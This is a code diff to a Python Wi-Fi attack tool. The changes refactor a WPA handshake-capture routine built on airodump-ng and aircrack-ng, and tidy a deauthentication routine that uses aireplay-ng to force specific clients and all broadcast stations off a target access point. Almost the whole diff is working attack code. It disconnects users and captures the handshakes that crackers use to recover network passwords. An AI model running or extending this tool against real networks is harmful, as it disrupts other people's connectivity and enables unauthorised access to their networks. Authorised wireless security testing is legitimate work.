@@ -6,17 +6,17 @@ import threading
 import shutil
 from datetime import datetime
 from utils import colored_log, Colors
+from scanner import detect_connected_clients
+import sys
 
 
 def capture_handshake(self, network) -> str | None:
-    """Capture handshake from target network"""
+    """Capture handshake from target network with countdown"""
     if not self.monitor_interface:
         colored_log("error", "No monitor mode interface found")
         return None
 
     # Detect connected clients
-    from scanner import detect_connected_clients
-
     clients = detect_connected_clients(self, network)
     if not clients:
         colored_log(
@@ -35,10 +35,6 @@ def capture_handshake(self, network) -> str | None:
 
     colored_log("info", f"Starting handshake capture for {network.essid}...")
 
-    # Reset flags
-    self.stop_capture = False
-    self.handshake_found = False
-
     # Start capture process
     capture_cmd = [
         "airodump-ng",
@@ -55,46 +51,43 @@ def capture_handshake(self, network) -> str | None:
         capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
 
-    # Start handshake watcher
+    # Start countdown
     cap_file = f"{capture_path}-01.cap"
-    watcher_thread = threading.Thread(
-        target=_handshake_watcher,
-        args=(
-            self,
-            cap_file,
-        ),
-    )
-    watcher_thread.daemon = True
-    watcher_thread.start()
-
-    # Limit capturing to 1 minute
     timeout = 60  # 1 minute
     start_time = time.time()
     try:
-        while not self.handshake_found:
+        while True:
             elapsed_time = int(time.time() - start_time)
             remaining_time = max(0, timeout - elapsed_time)
+            minutes, seconds = divmod(remaining_time, 60)
+            time_str = f"{minutes:02d}:{seconds:02d} remaining"
+            sys.stdout.write(
+                f"\r{Colors.BLUE}[*] Capturing handshake for {network.essid}: {time_str}{Colors.ENDC}"
+            )
+            sys.stdout.flush()
 
-            if elapsed_time % 1 == 0:
-                print(
-                    f"{Colors.BLUE}[*] Capturing handshake... Time left: {remaining_time}s{Colors.ENDC}",
-                    end="\r",
-                )
+            # Check for handshake directly in main thread
+            if os.path.exists(cap_file) and _check_handshake(self, cap_file):
+                sys.stdout.write(f"\r{' ' * 80}\r")  # Clear line with enough spaces
+                sys.stdout.flush()
+                colored_log("success", "Handshake detected!")
+                break
 
             if elapsed_time >= timeout:
+                sys.stdout.write(f"\r{' ' * 80}\r")  # Clear line with enough spaces
+                sys.stdout.flush()
                 colored_log("warning", "Handshake capture timed out after 1 minute.")
                 break
             time.sleep(1)
     except KeyboardInterrupt:
+        sys.stdout.write(f"\r{' ' * 80}\r")  # Clear line with enough spaces
+        sys.stdout.flush()
         colored_log("warning", "Capture cancelled by user")
     finally:
-        self.stop_capture = True
         capture_proc.send_signal(signal.SIGTERM)
         capture_proc.wait()
 
-    print("\n")  # Move to next line after countdown
-
-    if not self.handshake_found:
+    if not os.path.exists(cap_file) or not _check_handshake(self, cap_file):
         colored_log("error", "Failed to capture handshake after deauthentication.")
         return None
 
@@ -114,24 +107,21 @@ def deauthenticate_clients(self, network, clients: list[str]):
         f"Starting deauthentication for {len(clients)} clients on {network.essid}...",
     )
 
-    # 1. Function to perform individual deauth without waiting
     def deauth_client(client: str):
         deauth_cmd = [
             "aireplay-ng",
             "--deauth",
-            "3",  # Reduced to 3 packets for speed
+            "3",
             "-a",
             network.bssid,
             "-c",
             client,
             self.monitor_interface,
         ]
-        # Jalankan tanpa menunggu
         subprocess.Popen(
             deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
 
-    # Start threads without waiting
     threads = []
     for client in clients:
         colored_log("info", f"Sending deauth to client {client}...")
@@ -140,15 +130,13 @@ def deauthenticate_clients(self, network, clients: list[str]):
         thread.start()
         threads.append(thread)
 
-    # Minimal wait to ensure packets are sent
     for thread in threads:
-        thread.join(timeout=0.5)  # Reduced timeout to 0.5 seconds
+        thread.join(timeout=0.5)
 
-    # 2. Perform broadcast deauth without waiting
     broadcast_deauth_cmd = [
         "aireplay-ng",
         "--deauth",
-        "3",  # Reduced to 3 packets
+        "3",
         "-a",
         network.bssid,
         self.monitor_interface,
@@ -158,21 +146,9 @@ def deauthenticate_clients(self, network, clients: list[str]):
         broadcast_deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
 
-    # Log completion immediately
     colored_log(
         "success", "Deauthentication process initiated for all connected clients."
     )
-
-
-def _handshake_watcher(self, cap_file: str):
-    """Watch for handshake in capture file"""
-    while not self.stop_capture:
-        if os.path.exists(cap_file) and _check_handshake(self, cap_file):
-            colored_log("success", "Handshake detected!")
-            self.handshake_found = True
-            self.stop_capture = True
-            break
-        time.sleep(1)  # Check every 1 seconds
 
 
 def _check_handshake(self, cap_file: str) -> bool:
@@ -182,6 +158,5 @@ def _check_handshake(self, cap_file: str) -> bool:
     if not os.path.exists(cap_file):
         return False
 
-    # Check with aircrack-ng
     result = execute_command(["aircrack-ng", cap_file])
     return result and "1 handshake" in result.stdout
